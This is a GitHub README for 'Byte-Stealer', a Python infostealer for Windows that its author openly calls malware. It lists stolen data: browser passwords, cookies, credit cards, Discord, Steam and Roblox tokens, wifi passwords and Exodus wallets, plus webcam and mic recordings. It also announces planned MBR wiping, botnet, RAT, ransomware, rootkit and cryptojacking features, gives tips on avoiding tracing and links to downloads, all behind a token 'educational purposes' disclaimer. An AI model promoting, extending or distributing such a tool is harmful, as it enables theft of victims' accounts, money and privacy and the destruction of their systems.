
<p align="center">
 <img src="https://github.com/TurtlesXD/Byte-Stealer/blob/main/img/BYTESTEAELRDSICORDPFP.png" />


DO NOT USE LATEST RELEASE IT WILL NOT WORK, download the zip from here:https://github.com/TurtlesXD/Byte-Stealer/archive/refs/heads/main.zip
\
\
**i will not work on this repository until early september, as i am away from home. I honestly dont remember which was my last working commit, but i do believe my last release is working, so use that! If it doenst work, your probably gonna have to wait, srry.**

#### Upcoming features
```
• More data(more crypto wallet, more Browser database cracking n more app stealing)
• Steam SSFN auth cookie
• Discord cookie info (email, billing, etc)
• Startup Functionality(injector,Disabling certain apps like SystemSettings.exe by ending process, other malware capabilities)
• Cryptojacking(Btc address swapper, downloading crypto miner,probably xmrig, on victims computer)
• better configuration (Script editor that doesn't require manual editing)
• Edit the local drive (C:/) and overwrite the MBR(This will wipe the users system, super illegal and dangerous if accidentally ran)
• Botnet functionality(Crypto mining, control  the botnet using webserver/website, probably using a replit webserver, i have made a working prototype with ddos, screenshots, and cmd commands. I am using replit webserver as it is easier to control many co.puters by sending commands that they will read deom teh web. Using a vpn and temp mail will hide your info from replit.com so you cant be traced)
• Backdoor/rat functionality(will use the same replit webserver, but will have more specific commands for cmd prompt and powershell, and more features like mic record etc)
• Self DDOS(Will try and run a ddos script on the victims pc ip address, This will hopefully make their router unusable, without any traceback to you)
• Rootkit Functionality(Using Ctypes and the Windows API, this means you can execute commands like changing the users windows password(basic), or renaming Crucial system files)
• Keylogger?
• Minecraft session id cookie
• %APPDATA% cloner?
• File Stealer with certain keywords, ie. My passwords.txt?
• Worm Functionality?
• Ransomware feature?
• Reverse shell backdoor?
• Anti-Virtual Machine
• Obfuscation/F.U.D (This will jumble up the code, and make it unreadable, meaning its practically impossible for someone to get your webhook url and crypto wallets from the exe, if they even manage to decompile it.)
• Disable windows defender 
• Fake error popup
• fake BSOD;) if u really want it(not recommended as victim will know something is wrong)
• anything else (msg me on discord at chickenpie8636)
Question marks are a maybe btw, or not needed at the moment
```

[![Star on GitHub](https://img.shields.io/github/stars/TurtlesXD/Byte-Stealer.svg?style=social)](https://github.com/TurtlesXD/Byte-Stealer/stargazers)
[![Watch on GitHub](https://img.shields.io/github/watchers/TurtlesXD/Byte-Stealer.svg?style=social)](https://github.com/TurtlesXD/Byte-Stealer/watchers)
[![Issues on GitHub](https://img.shields.io/github/issues/TurtlesXD/Byte-Stealer.svg?style=social)](https://github.com/TurtlesXD/Byte-Stealer/issues)


# Byte-Stealer 1.2.5
A piece of malware written in python 3\
Only works in windows 10/11

### Features:
```
• IP logger 🌐
• System info 🖥️
• Wifi-password taker 📶
• Auto IP geolocator(city,country,postal,latitude&longitude) 🌎
• Roblox Cookie Stealer from Chrome,Opera,Firefox and Edge 🍪
• steamLoginSecure+sessionId Token Stealer (steam login cookie) from Chrome(not a client) 🍘
• Steal History-Bookmarks-Cookies-SavedLoginDetails-BrowserAutofill-CreditCards from basically all chromium browsers and sends them as .zip 📁
• Steal Discord token from all types of installation 🔘 
• Auto Screenshot as .png 🖼️
• Records 5s clip from webcam as .avi 🎥
• Records 5s clip from mic as .wav 🎤
• Crypto Wallet Stealer: Exodus👾
• No local caching 💾
```
## Discord Screenshots:
\
Screenshot and .zip files :\
![Alt text](img/SCREENIE1.png?raw=true)\
\
System Data and saved WiFi :\
![Alt text](img/SCREENIE2.png?raw=true)\
\
Geolocation Data and Roblox cookies :\
![Alt text](img/SCREENIE3.png?raw=true)\
\
Steam and discord cookies :\
![Alt text](img/SCREENIE4.png?raw=true)\
\
History-Bookmarks-Cookies-Passwords-CreditCards-Autofill.zip :\
![Alt text](img/SCREENIE5.png?raw=true)\
\
Exodus Appdata :\
![Alt text](img/SCREENIE6.png?raw=true)

## How to Run:
click [Here](https://github.com/TurtlesXD/Discord-Logger/blob/main/discord-logger-help/Help.md) for the guide

Thanks for checking out my repository!\
msg me at chickenpie8636
```
Note: This is for educational purposes, i do not condone the use of this script on people without their consent!
```

